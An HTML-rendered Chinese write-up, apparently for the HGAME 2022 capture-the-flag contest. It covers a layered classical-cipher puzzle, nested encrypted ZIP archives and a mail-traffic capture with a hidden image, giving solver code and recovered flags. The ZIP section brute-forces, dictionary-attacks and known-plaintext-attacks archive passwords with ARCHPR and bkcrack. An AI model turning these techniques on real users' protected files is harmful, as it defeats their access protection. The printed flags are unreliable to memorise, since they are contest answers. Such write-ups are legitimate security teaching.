        <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> j<span style="color:#f92672">=</span>i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>;j<span style="color:#f92672">&lt;</span>n;j<span style="color:#f92672">++</span>)<span style="color:#66d9ef">if</span>(A[j][i]<span style="color:#f92672">&gt;</span>A[k][i])k<span style="color:#f92672">=</span>j; 
        <span style="color:#66d9ef">double</span> del<span style="color:#f92672">=</span>A[k][i];
        <span style="color:#66d9ef">if</span>(fabs(del<span style="color:#f92672">=</span>A[k][i])<span style="color:#f92672">&lt;</span>eps)puts(<span style="color:#e6db74">&#34;no&#34;</span>);
		<span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> j<span style="color:#f92672">=</span>i;j<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">2</span><span style="color:#f92672">*</span>n;j<span style="color:#f92672">++</span>)swap(A[i][j],A[k][j]);
        <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> j<span style="color:#f92672">=</span>i;j<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">2</span><span style="color:#f92672">*</span>n;j<span style="color:#f92672">++</span>)A[i][j]<span style="color:#f92672">/=</span>del;
        <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> j<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;j<span style="color:#f92672">&lt;</span>n;j<span style="color:#f92672">++</span>)  
            <span style="color:#66d9ef">if</span>(j<span style="color:#f92672">!=</span>i)
            {
                del<span style="color:#f92672">=</span>A[j][i];
                <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> k<span style="color:#f92672">=</span>i;k<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">2</span><span style="color:#f92672">*</span>n;k<span style="color:#f92672">++</span>)A[j][k]<span style="color:#f92672">-=</span>A[i][k]<span style="color:#f92672">*</span>del;
            }
    }
}

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
{
	<span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;i<span style="color:#f92672">&lt;</span>n;i<span style="color:#f92672">++</span>)
		<span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> j<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;j<span style="color:#f92672">&lt;</span>n;j<span style="color:#f92672">++</span>){
			a[i][j]<span style="color:#f92672">=</span>dword_4140[i<span style="color:#f92672">*</span>n<span style="color:#f92672">+</span>j]<span style="color:#f92672">/</span><span style="color:#ae81ff">10</span>;
			b[i][j]<span style="color:#f92672">=</span>dword_8140[i<span style="color:#f92672">*</span>n<span style="color:#f92672">+</span>j]<span style="color:#f92672">/</span><span style="color:#ae81ff">10</span>;
		}
	<span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;i<span style="color:#f92672">&lt;</span>n;i<span style="color:#f92672">++</span>)
			<span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> j<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;j<span style="color:#f92672">&lt;</span>n;j<span style="color:#f92672">++</span>)
				<span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> k<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;k<span style="color:#f92672">&lt;</span>n;k<span style="color:#f92672">++</span>)c[i][j]<span style="color:#f92672">+=</span>a[i][k]<span style="color:#f92672">*</span>b[k][j];
	<span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;i<span style="color:#f92672">&lt;</span>n;i<span style="color:#f92672">++</span>)c[i][i<span style="color:#f92672">+</span>n]<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>;
	gauss(c);
	<span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;i<span style="color:#f92672">&lt;</span>n;i<span style="color:#f92672">++</span>)
    	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;j<span style="color:#f92672">&lt;</span>n;j<span style="color:#f92672">++</span>)
    		f[i]<span style="color:#f92672">+=</span>ini[j]<span style="color:#f92672">*</span>c[j][i<span style="color:#f92672">+</span>n];
    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;i<span style="color:#f92672">&lt;</span>n;i<span style="color:#f92672">++</span>)
    	printf(<span style="color:#e6db74">&#34;%c&#34;</span>,<span style="color:#66d9ef">char</span>(<span style="color:#66d9ef">int</span>(floor(f[i]<span style="color:#f92672">+</span><span style="color:#ae81ff">0.5</span>))));
	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><h3 id="cryptodancing-line">[Crypto]Dancing Line</h3>
<h3 id="cryptomatryohska">[Crypto]Matryohska</h3>
<blockquote>
<p>By NULLPointer</p>
</blockquote>
<p>下载压缩包，解压得到一个名为 Matryoshka.txt 的文件，里面的内容为 Braille（盲文）加密，使用盲文破解网站 <a class="link" href="https://unicode-table.com/cn/tools/braille/"  target="_blank" rel="noopener"
    >https://unicode-table.com/cn/tools/braille/</a> 解密：</p>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 261; 
			flex-basis: 627px"
	>
	<a href="/post/hgame2022-writeup-by-or4nge/img/Matryohska_Braille.png" data-size="1363x521">
		<img src="/post/hgame2022-writeup-by-or4nge/img/Matryohska_Braille.png"
			width="1363"
			height="521"
			srcset="/post/hgame2022-writeup-by-or4nge/img/Matryohska_Braille_hu1ef9402c42d229f1a815d5ff057eea54_49890_480x0_resize_box_3.png 480w, /post/hgame2022-writeup-by-or4nge/img/Matryohska_Braille_hu1ef9402c42d229f1a815d5ff057eea54_49890_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<p>此时发现解密得到的字符共有三种：<code>-</code>，<code>/</code>，和 <code>⠨</code>，猜测下一层为 Morse 密码。用 <code>.</code> 替换 <code>⠨</code> 后使用Morse密码解密网站 <a class="link" href="https://www.bejson.com/enc/morse/"  target="_blank" rel="noopener"
    >https://www.bejson.com/enc/morse/</a> 得到：</p>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 328; 
			flex-basis: 789px"
	>
	<a href="/post/hgame2022-writeup-by-or4nge/img/Matryohska_Matwrong.jpg" data-size="1200x365">
		<img src="/post/hgame2022-writeup-by-or4nge/img/Matryohska_Matwrong.jpg"
			width="1200"
			height="365"
			srcset="/post/hgame2022-writeup-by-or4nge/img/Matryohska_Matwrong_huaf77fcc770d1ebaab12e40da6bea5e9f_99673_480x0_resize_q75_box.jpg 480w, /post/hgame2022-writeup-by-or4nge/img/Matryohska_Matwrong_huaf77fcc770d1ebaab12e40da6bea5e9f_99673_1024x0_resize_q75_box.jpg 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<p>得到的字符串显然不是正确形式。注意到每两个字符由一个逗号间隔，而逗号的 Morse 编码为一段回文字符串 <code>--..--</code>。联想到题目中出现的“纸条背面”的提示，尝试将字符串倒转处理。此时逗号位置的 Morse 编码仍为 <code>--..--</code>。解码得到：</p>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 296; 
			flex-basis: 711px"
	>
	<a href="/post/hgame2022-writeup-by-or4nge/img/Matryohska_Matright.jpg" data-size="1200x405">
		<img src="/post/hgame2022-writeup-by-or4nge/img/Matryohska_Matright.jpg"
			width="1200"
			height="405"
			srcset="/post/hgame2022-writeup-by-or4nge/img/Matryohska_Matright_hud680c8ff9e80c35773d650698972e193_104665_480x0_resize_q75_box.jpg 480w, /post/hgame2022-writeup-by-or4nge/img/Matryohska_Matright_hud680c8ff9e80c35773d650698972e193_104665_1024x0_resize_q75_box.jpg 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<p>发现是 Hex 编码，使用 Python 编写脚本解密得到一段 Base64 字符串：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">b <span style="color:#f92672">=</span>[<span style="color:#ae81ff">0x46</span>,<span style="color:#ae81ff">0x66</span>,<span style="color:#ae81ff">0x42</span>,<span style="color:#ae81ff">0x75</span>,<span style="color:#ae81ff">0x66</span>,<span style="color:#ae81ff">0x45</span>,<span style="color:#ae81ff">0x46</span>,<span style="color:#ae81ff">0x6E</span>,<span style="color:#ae81ff">0x6D</span>,<span style="color:#ae81ff">0x4C</span>,<span style="color:#ae81ff">0x73</span>,<span style="color:#ae81ff">0x36</span>,<span style="color:#ae81ff">0x44</span>,<span style="color:#ae81ff">0x33</span>,<span style="color:#ae81ff">0x73</span>,<span style="color:#ae81ff">0x69</span>,<span style="color:#ae81ff">0x59</span>,<span style="color:#ae81ff">0x74</span>,<span style="color:#ae81ff">0x4C</span>,<span style="color:#ae81ff">0x36</span>,<span style="color:#ae81ff">0x58</span>,<span style="color:#ae81ff">0x32</span>,<span style="color:#ae81ff">0x70</span>,<span style="color:#ae81ff">0x34</span>,<span style="color:#ae81ff">0x69</span>,<span style="color:#ae81ff">0x4E</span>,<span style="color:#ae81ff">0x30</span>,<span style="color:#ae81ff">0x63</span>,<span style="color:#ae81ff">0x64</span>,<span style="color:#ae81ff">0x53</span>,<span style="color:#ae81ff">0x6C</span>,<span style="color:#ae81ff">0x79</span>,<span style="color:#ae81ff">0x6B</span>,<span style="color:#ae81ff">0x6D</span>,<span style="color:#ae81ff">0x39</span>,<span style="color:#ae81ff">0x72</span>,<span style="color:#ae81ff">0x51</span>,<span style="color:#ae81ff">0x4E</span>,<span style="color:#ae81ff">0x39</span>,<span style="color:#ae81ff">0x6F</span>,<span style="color:#ae81ff">0x4D</span>,<span style="color:#ae81ff">0x53</span>,<span style="color:#ae81ff">0x31</span>,<span style="color:#ae81ff">0x6A</span>,<span style="color:#ae81ff">0x6B</span>,<span style="color:#ae81ff">0x73</span>,<span style="color:#ae81ff">0x39</span>,<span style="color:#ae81ff">0x72</span>,<span style="color:#ae81ff">0x4B</span>,<span style="color:#ae81ff">0x32</span>,<span style="color:#ae81ff">0x52</span>,<span style="color:#ae81ff">0x36</span>,<span style="color:#ae81ff">0x6B</span>,<span style="color:#ae81ff">0x4C</span>,<span style="color:#ae81ff">0x38</span>,<span style="color:#ae81ff">0x68</span>,<span style="color:#ae81ff">0x6F</span>,<span style="color:#ae81ff">0x72</span>,<span style="color:#ae81ff">0x30</span>,<span style="color:#ae81ff">0x3D</span>]
flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> b:
    flag <span style="color:#f92672">+=</span> chr(i)
print(flag)
<span style="color:#75715e"># &#34;FfBufEFnmLs6D3siYtL6X2p4iN0cdSlykm9rQN9oMS1jks9rK2R6kL8hor0=&#34;</span>
</code></pre></div><p>解码 Base64 时系统报错，说明得到的只是一个 Base64 形式的字符串。题目中的 “Caesar:21; Vigenère: hgame” 提示 flag 经历了偏移量为 21 的凯撒加密和 key 为 hgame 的维吉尼亚加密，因此编写脚本尝试破解，发现最终加密算法为：flag -&gt; 22位栅栏 -&gt; 21位凯撒 -&gt; 密钥为 hgame 的维吉尼亚，逆向解密即可：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">//Vigenère
</span><span style="color:#75715e"></span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">char</span> key[<span style="color:#ae81ff">105</span>], sd[<span style="color:#ae81ff">1005</span>];

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
    gets(key);
    gets(sd);
    <span style="color:#66d9ef">int</span> i,ptr;
    <span style="color:#66d9ef">for</span>(i<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>;i<span style="color:#f92672">&lt;=</span>strlen(key);i<span style="color:#f92672">++</span>) {
        <span style="color:#66d9ef">if</span>(key[i<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">&gt;=</span><span style="color:#ae81ff">65</span><span style="color:#f92672">&amp;&amp;</span>key[i<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">&lt;=</span><span style="color:#ae81ff">90</span>) key[i<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">+=</span><span style="color:#ae81ff">32</span>;
    }
    ptr<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>;
    <span style="color:#66d9ef">for</span>(i<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>;i<span style="color:#f92672">&lt;=</span>strlen(sd);i<span style="color:#f92672">++</span>) {
        <span style="color:#66d9ef">if</span>(sd[i<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">&gt;=</span><span style="color:#ae81ff">65</span><span style="color:#f92672">&amp;&amp;</span>sd[i<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">&lt;=</span><span style="color:#ae81ff">90</span>) {
            <span style="color:#66d9ef">if</span>(sd[i<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">-</span>key[ptr<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">&gt;=</span><span style="color:#ae81ff">65</span>) {
                sd[i<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">=</span>sd[i<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">-</span>key[ptr<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;a&#39;</span>;
                ptr<span style="color:#f92672">++</span>;
            }
            <span style="color:#66d9ef">else</span> {
                sd[i<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">=</span>sd[i<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">-</span>key[ptr<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">+</span><span style="color:#ae81ff">26</span>;
                ptr<span style="color:#f92672">++</span>;
            }
        }
        <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(sd[i<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">&gt;=</span><span style="color:#ae81ff">97</span><span style="color:#f92672">&amp;&amp;</span>sd[i<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">&lt;=</span><span style="color:#ae81ff">122</span>) {
            <span style="color:#66d9ef">if</span>(sd[i<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">-</span>key[ptr<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">&gt;=</span><span style="color:#ae81ff">97</span>) {
                sd[i<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">=</span>sd[i<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">-</span>key[ptr<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;a&#39;</span>;
                ptr<span style="color:#f92672">++</span>;
            }
            <span style="color:#66d9ef">else</span> {
                sd[i<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">=</span>sd[i<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">-</span>key[ptr<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">+</span><span style="color:#ae81ff">26</span>;
                ptr<span style="color:#f92672">++</span>;
            }
        }
        <span style="color:#66d9ef">if</span>(ptr<span style="color:#f92672">&gt;</span>strlen(key)) {
            ptr<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>;
        }
    }
    <span style="color:#66d9ef">for</span>(i<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>;i<span style="color:#f92672">&lt;=</span>strlen(sd);i<span style="color:#f92672">++</span>) {
        printf(<span style="color:#e6db74">&#34;%c&#34;</span>,sd[i<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]);
    }
}
<span style="color:#75715e">// &#34;YzBibXZnaHl6X3swUmF6X2d4eG0wdGhrem9fMG9iMG1fdm9rY2N6dF8hcn0=&#34;
</span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">deCaesar</span>(string,move):
    s <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> string:
        <span style="color:#66d9ef">if</span> ord(i) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">65</span> <span style="color:#f92672">and</span> ord(i) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">90</span>:
            <span style="color:#66d9ef">if</span> (ord(i) <span style="color:#f92672">-</span> ord(<span style="color:#e6db74">&#39;A&#39;</span>) <span style="color:#f92672">-</span> move) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>:
                s <span style="color:#f92672">+=</span> chr(ord(i) <span style="color:#f92672">-</span> move)
            <span style="color:#66d9ef">else</span>:
                s <span style="color:#f92672">+=</span> chr(ord(i) <span style="color:#f92672">-</span> move <span style="color:#f92672">+</span> <span style="color:#ae81ff">26</span>)
        <span style="color:#66d9ef">elif</span> ord(i) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">97</span> <span style="color:#f92672">and</span> ord(i) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">122</span>:
            <span style="color:#66d9ef">if</span> (ord(i) <span style="color:#f92672">-</span> ord(<span style="color:#e6db74">&#39;a&#39;</span>) <span style="color:#f92672">-</span> move) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>:
                s <span style="color:#f92672">+=</span> chr(ord(i) <span style="color:#f92672">-</span> move)
            <span style="color:#66d9ef">else</span>:
                s <span style="color:#f92672">+=</span> chr(ord(i) <span style="color:#f92672">-</span> move <span style="color:#f92672">+</span> <span style="color:#ae81ff">26</span>)
        <span style="color:#66d9ef">else</span>:
            s <span style="color:#f92672">+=</span> i
    <span style="color:#66d9ef">return</span> s

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">deFence</span>(string,space):
   s <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
   <span style="color:#66d9ef">if</span> len(string) <span style="color:#f92672">%</span> space <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
       key <span style="color:#f92672">=</span> len(string) <span style="color:#f92672">//</span> space
   <span style="color:#66d9ef">else</span>:
       key <span style="color:#f92672">=</span> len(string) <span style="color:#f92672">//</span> space <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
   <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, key):
       <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(i, len(string), key):
           <span style="color:#66d9ef">if</span> j <span style="color:#f92672">&lt;</span> len(string):
               s <span style="color:#f92672">+=</span> string[j]
   <span style="color:#66d9ef">return</span> s

<span style="color:#f92672">import</span> base64
temp <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;YzBibXZnaHl6X3swUmF6X2d4eG0wdGhrem9fMG9iMG1fdm9rY2N6dF8hcn0=&#34;</span>
flag <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(temp)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">50</span>):
    print(deFence(deCaesar(flag, <span style="color:#ae81ff">21</span>), i)) <span style="color:#75715e"># i = 22</span>
<span style="color:#75715e"># &#34;hgame{Welc0me_t0_the_w0rld_0f_crypt0graphy!}&#34;</span>
</code></pre></div><h3 id="cryptoeasy-rsa">[Crypto]Easy RSA</h3>
<h3 id="cryptoenglish-novel">[Crypto]English Novel</h3>
<h3 id="misc这个压缩包有点麻烦">[Misc]这个压缩包有点麻烦</h3>
<blockquote>
<p>By NULLPointer</p>
</blockquote>
<p>下载题目，得到一个加密的压缩包，打开后发现提示：</p>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 901; 
			flex-basis: 2163px"
	>
	<a href="/post/hgame2022-writeup-by-or4nge/img/Trouble_zip_level1.png" data-size="1686x187">
		<img src="/post/hgame2022-writeup-by-or4nge/img/Trouble_zip_level1.png"
			width="1686"
			height="187"
			srcset="/post/hgame2022-writeup-by-or4nge/img/Trouble_zip_level1_hu5cc55c4cc8fcd5cc8e94d4d6b88693e7_20591_480x0_resize_box_3.png 480w, /post/hgame2022-writeup-by-or4nge/img/Trouble_zip_level1_hu5cc55c4cc8fcd5cc8e94d4d6b88693e7_20591_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<p>猜测第一层压缩包的密码是 6 位数字，属于弱口令，可以通过暴力破解得到压缩包口令。使用压缩包爆破工具 ARCHPR，设置口令为 6 位数字，暴力破解，得到压缩包密码为 483279。</p>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 232; 
			flex-basis: 558px"
	>
	<a href="/post/hgame2022-writeup-by-or4nge/img/Trouble_zip_6digits.png" data-size="666x286">
		<img src="/post/hgame2022-writeup-by-or4nge/img/Trouble_zip_6digits.png"
			width="666"
			height="286"
			srcset="/post/hgame2022-writeup-by-or4nge/img/Trouble_zip_6digits_hufa710a20e81c59678c4c6db855815f7c_45418_480x0_resize_box_3.png 480w, /post/hgame2022-writeup-by-or4nge/img/Trouble_zip_6digits_hufa710a20e81c59678c4c6db855815f7c_45418_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<p>解压得到 flag.zip，README.md 和 password-note.txt 三个文件，其中 flag.zip 是加密的压缩包，README.md 中发现提示：</p>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 762; 
			flex-basis: 1829px"
	>
	<a href="/post/hgame2022-writeup-by-or4nge/img/Trouble_zip_tip.png" data-size="968x127">
		<img src="/post/hgame2022-writeup-by-or4nge/img/Trouble_zip_tip.png"
			width="968"
			height="127"
			srcset="/post/hgame2022-writeup-by-or4nge/img/Trouble_zip_tip_hub7027b049dadde1d4bd2c8c523192d43_10211_480x0_resize_box_3.png 480w, /post/hgame2022-writeup-by-or4nge/img/Trouble_zip_tip_hub7027b049dadde1d4bd2c8c523192d43_10211_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<p>推测给出的密码本 password-note.txt 中存在压缩包的密码，因此使用字典爆破得到口令：</p>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 241; 
			flex-basis: 580px"
	>
	<a href="/post/hgame2022-writeup-by-or4nge/img/Trouble_zip_level2.png" data-size="660x273">
		<img src="/post/hgame2022-writeup-by-or4nge/img/Trouble_zip_level2.png"
			width="660"
			height="273"
			srcset="/post/hgame2022-writeup-by-or4nge/img/Trouble_zip_level2_hu7270c18238be5323f81d2716266bf0c6_51013_480x0_resize_box_3.png 480w, /post/hgame2022-writeup-by-or4nge/img/Trouble_zip_level2_hu7270c18238be5323f81d2716266bf0c6_51013_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<p>第二层压缩包解压后得到第三个加密的压缩包 flag.zip 和一个 README.md 文件。将 md 文件压缩后在 WinRAR 中查看，发现其 CRC32 值和 flag.zip 中的 README.md 文件 CRC32 值相同。于是推测这两个文件可能是同一文件，因此使用明文爆破的方式攻击。</p>
<p>明文爆破时 ARCHPR 报错，说明这两个 README.md 文件是不完整的文件。使用 github 上的工具 bkcrack 进行不完整明文攻击，得到部分口令并直接分离出图片 flag.zip。</p>
<p>使用 HexEditor 查看图片，发现其中有 zip 格式的开始字段 <code>50 4B 03 04</code> 和结束字段 <code>50 4B 05 06</code>。</p>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 392; 
			flex-basis: 941px"
	>
	<a href="/post/hgame2022-writeup-by-or4nge/img/Trouble_zip_hidzip.jpg" data-size="694x177">
		<img src="/post/hgame2022-writeup-by-or4nge/img/Trouble_zip_hidzip.jpg"
			width="694"
			height="177"
			srcset="/post/hgame2022-writeup-by-or4nge/img/Trouble_zip_hidzip_hu4c35d1743c256eba7a489e1aaf21b587_82215_480x0_resize_q75_box.jpg 480w, /post/hgame2022-writeup-by-or4nge/img/Trouble_zip_hidzip_hu4c35d1743c256eba7a489e1aaf21b587_82215_1024x0_resize_q75_box.jpg 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<p>使用 binwalk 工具分离得到一个加密的压缩包，用 HexEditor 查看发现数据标志位和目录标志位均为 <code>09 00</code>，猜测使用了伪加密并将其改为 <code>00 00</code>，发现压缩包内文件解密，即可得到 flag。</p>
<h3 id="misc好康的流量">[Misc]好康的流量</h3>
<blockquote>
<p>By NULLPointer</p>
</blockquote>
<p>Wireshark查看流量包，发现协议仅有 TCP 与 SMTP 两种，其中 TCP 建立通信，SMTP 用于传输文件。由题目提示可知流量包中可能含有一张图片。</p>
<p>追踪 TCP 流发现一小段 Base64 编码，解密发现提示可能用到 LSB 隐写。</p>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 844; 
			flex-basis: 2026px"
	>
	<a href="/post/hgame2022-writeup-by-or4nge/img/GoodNetwork_hint.png" data-size="1216x144">
		<img src="/post/hgame2022-writeup-by-or4nge/img/GoodNetwork_hint.png"
			width="1216"
			height="144"
			srcset="/post/hgame2022-writeup-by-or4nge/img/GoodNetwork_hint_hub360c69ca5ec6d564c916a53e8937bf9_18254_480x0_resize_box_3.png 480w, /post/hgame2022-writeup-by-or4nge/img/GoodNetwork_hint_hub360c69ca5ec6d564c916a53e8937bf9_18254_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 250; 
			flex-basis: 601px"
	>
	<a href="/post/hgame2022-writeup-by-or4nge/img/GoodNetwork_base64.png" data-size="992x396">
		<img src="/post/hgame2022-writeup-by-or4nge/img/GoodNetwork_base64.png"
			width="992"
			height="396"
			srcset="/post/hgame2022-writeup-by-or4nge/img/GoodNetwork_base64_hufb41f0c7acf8ff78be6e3088594834ca_7769_480x0_resize_box_3.png 480w, /post/hgame2022-writeup-by-or4nge/img/GoodNetwork_base64_hufb41f0c7acf8ff78be6e3088594834ca_7769_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<p>TCP 流中还存在一大段 Base64 编码，<code>Content-Type: image/png</code> 提示这段编码即为传输的图片，使用 Base64 转图片工具 <a class="link" href="https://tool.jisuapi.com/base642pic.html"  target="_blank" rel="noopener"
    >https://tool.jisuapi.com/base642pic.html</a> 得到传输的图片。</p>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 215; 
			flex-basis: 516px"
	>
	<a href="/post/hgame2022-writeup-by-or4nge/img/GoodNetwork_image.png" data-size="1197x556">
		<img src="/post/hgame2022-writeup-by-or4nge/img/GoodNetwork_image.png"
			width="1197"
			height="556"
			srcset="/post/hgame2022-writeup-by-or4nge/img/GoodNetwork_image_hu10d5edb2f5b098f2d31dce16b6a34984_80099_480x0_resize_box_3.png 480w, /post/hgame2022-writeup-by-or4nge/img/GoodNetwork_image_hu10d5edb2f5b098f2d31dce16b6a34984_80099_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 118; 
			flex-basis: 284px"
	>
	<a href="/post/hgame2022-writeup-by-or4nge/img/GoodNetwork_base2image.png" data-size="754x635">
		<img src="/post/hgame2022-writeup-by-or4nge/img/GoodNetwork_base2image.png"
			width="754"
			height="635"
			srcset="/post/hgame2022-writeup-by-or4nge/img/GoodNetwork_base2image_hu4c0c636db3e86c90f49c2c42938d337a_484752_480x0_resize_box_3.png 480w, /post/hgame2022-writeup-by-or4nge/img/GoodNetwork_base2image_hu4c0c636db3e86c90f49c2c42938d337a_484752_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<p>使用 Stegsolve 查看图片各个通道，在 Green2 通道中发现条形码，扫描得到 flag 的前半段。</p>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 195; 
			flex-basis: 469px"
	>
	<a href="/post/hgame2022-writeup-by-or4nge/img/GoodNetwork_firsthalf.png" data-size="773x395">
